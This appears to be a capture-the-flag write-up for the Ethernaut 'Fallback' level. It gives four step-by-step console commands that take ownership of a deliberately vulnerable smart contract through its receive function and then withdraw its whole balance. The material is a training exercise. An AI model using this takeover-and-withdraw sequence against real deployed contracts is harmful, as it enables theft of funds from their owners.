# Fallback

The receive function is flawed, we just need to send some value via contribute and then via receive to change the owner. The contribute requires less than 0.001 ether to function, and receive expects at least 0, so:

1. We send `await contract.contribute({value: "1"})`.
2. We send money to the contract address via a fallback function. This can be done by calling an undefined function in the contract with some ether value, such as: `await contract.sendTransaction({from: player, value: "1", data: undefined})`.
3. You can now see that you are the owner via `await contract.owner()`, or make really really sure with `(await contract.owner()) === player`
4. To deal the final blow, we call the `await contract.withdraw()`. By only spending 2 Wei, we got the owners balance :)
